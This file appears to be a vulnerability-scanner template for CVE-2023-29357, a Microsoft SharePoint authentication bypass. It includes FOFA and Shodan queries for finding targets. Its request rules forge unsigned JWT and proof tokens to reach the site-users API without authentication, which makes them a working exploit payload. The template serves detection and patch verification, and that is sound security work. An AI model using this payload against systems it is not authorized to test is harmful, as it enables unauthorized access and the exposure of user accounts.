id: CVE-2023-29357

info:
  name: Microsoft SharePoint - Authentication Bypass
  author: pdteam
  severity: critical
  verified: false
  description: |
    Microsoft SharePoint Server Elevation of Privilege Vulnerability
    FOFA: http.headers_hash:-1968878704
    SHODAN: app="Microsoft-SharePoint"
  reference:
    - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-29357
    - https://srcincite.io/advisories/src-2020-0022/
    - https://github.com/Chocapikk/CVE-2023-29357
    - https://sec.vnpt.vn/2023/08/phan-tich-cve-2023-29357-microsoft-sharepoint-validatetokenissuer-authentication-bypass-vulnerability/
    - https://starlabs.sg/blog/2023/09-sharepoint-pre-auth-rce-chain/
  tags: cve,cve2023,microsoft,sharepoint_server
  created: 2023/10/12

set:
  client_id: "00000003-0000-0ff1-ce00-000000000000"
rules:
  r0:
    request:
      method: GET
      path: /_api/web/siteusers
      headers:
        Authorization: Bearer
    expression: response.raw_header.bcontains(b"realm=")
    output:
      search: '"realm=\"(?P<realm>.*?)\",client_id=\"".bsubmatch(response.raw_header)'
      realm: search["realm"]
  r1:
    request:
      method: GET
      path: /_api/web/siteusers
      headers:
        Accept: application/json
        Authorization: 'Bearer {{generate_jwt("{\"aud\":\"{{client_id}}@{{realm}}\",\"iss\":\"{{client_id}}\",\"nbf\":1695987703,\"exp\":2011547223,\"ver\":\"hashedprooftoken\",\"nameid\":\"{{client_id}}@{{realm}}\",\"endpointurl\":\"qqlAJmTxpB9A67xSyZk+tmrrNmYClY/fqig7ceZNsSM=\",\"endpointurlLength\":1,\"isloopback\":true}","none")}}AAA'
        X-PROOF_TOKEN: '{{generate_jwt("{\"aud\":\"{{client_id}}@{{realm}}\",\"iss\":\"{{client_id}}\",\"nbf\":1695987703,\"exp\":2011547223,\"ver\":\"hashedprooftoken\",\"nameid\":\"{{client_id}}@{{realm}}\",\"endpointurl\":\"qqlAJmTxpB9A67xSyZk+tmrrNmYClY/fqig7ceZNsSM=\",\"endpointurlLength\":1,\"isloopback\":true}","none")}}AAA'
    expression: |
      response.body.bcontains(b'LoginName') &&
      response.body.bcontains(b'Email') &&
      response.body.bcontains(b'IsSiteAdmin') 
expression: r0() && r1()
